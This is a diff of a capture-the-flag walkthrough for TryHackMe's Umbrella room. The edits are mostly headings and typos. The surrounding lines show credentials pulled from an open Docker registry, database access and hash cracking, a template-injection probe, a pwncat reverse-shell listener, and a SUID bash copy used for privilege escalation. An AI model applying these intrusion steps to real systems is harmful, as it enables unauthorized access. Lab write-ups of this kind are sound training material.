@@ -125,7 +125,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Fri Jan 26 19:38:47 2024 -- 1 IP address (1 host up) scanned in 60.71 seconds
 ```
 
-### Docker Registry - 5000
+## Docker Registry - 5000
 
 If a docker registry is open we can perform GET requests to certain docker API endpoints to retreive some key information about the images & tags.
 
@@ -197,7 +197,7 @@ sh3bu@Ubuntu:~/thm/umbrella$ curl -X GET http://10.10.79.214:5000/v2/umbrella/ti
 
 Taking a close look at the reposne we can find the **DB_USER**, **DB_PASS**, **DB_DATABASE** information which will come handy later.
 
-### MYSQL - 3306
+## MYSQL - 3306
 
 With the mysql credentials found, we can login as root to the mysql database.
 
@@ -262,7 +262,7 @@ mysql> select * from users;
 
 Using [crackstation.net](https://crackstation.net) , we can crack those password hashes.
 
-### HTTP 8080
+## HTTP 8080
 
 It is a simple login page.
 
@@ -300,14 +300,16 @@ by Ben "epi" Risher 🤓                 ver: 2.10.1
 200      GET      135l      273w     2558c http://10.10.79.214:8080/css/style.css
 ```
 
-With the credentials I got previously from MYSQL , I was able to login to the site as `claire-r`.
+With the credentials I got previously from MYSQL, I was able to log in to the site as `claire-r`.
 
 ![header](img/increase-time.png#center)
+
+# Shell as claire-r on host machine
 
 The site has the following tip 
 > You can also use mathematical expressions, eg. `5+4`
 
-This made me think if SSTI exists. So I entered the following payload`9*10` in order to increase the time spent by 90 minutes & it did!
+This made me think if SSTI exists. So I entered the following payload`9*10` in order to increase the time spent by 90 minutes & it did change from **6 hours** to **7.30 hoours**!
 
 ![header](img/template-injection.png#center)
 
@@ -351,6 +353,9 @@ uid=1001(claire-r) gid=1001(claire-r) groups=1001(claire-r)
 claire-r@ctf:~$ cat user.txt 
 THM{d832c0*********************25e}
 ```
+
+# Shell as root on the container
+
 The `timetracker-src` folder in the home directory had all the files related to Node.js container application. The `docker-compose.yml` had the following contents.
 
 ```bash
@@ -387,6 +392,8 @@ drwxrwxr-x 6 claire-r claire-r    4096 Dec 22  2022 ..
 -rwsr-sr-x 1 root     root     1234376 Jan 26 17:01 bash
 -rw-r--r-- 1 root     root         359 Jan 26 16:43 tt.log
 ```
+
+## Reverse shell via eval()
 
 The `app.js` file had the source code for the container application running at port 8080.
 ```bash
@@ -447,6 +454,8 @@ sh3bu@Ubuntu:~/thm/umbrella$ pwncat-cs -lp 9001
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
+# Shell as root on host machine
+
 The `logs` directory which we saw in the host machine as claire-r was also present in the root directory of the container as mentioned in the **docker-compose.yml** file.
 
 ```
@@ -481,6 +490,8 @@ drwxr-xr-x   1 root root 4096 Dec 19  2022 var
 (remote) root@de0610f51845:/# ls logs/
 tt.log
 ```
+
+## Docker-privesc
 
 So we have shell access to claire-r on the host machine & also root on the container. How can we privesc  & gain a shell as root on the host machine?
 
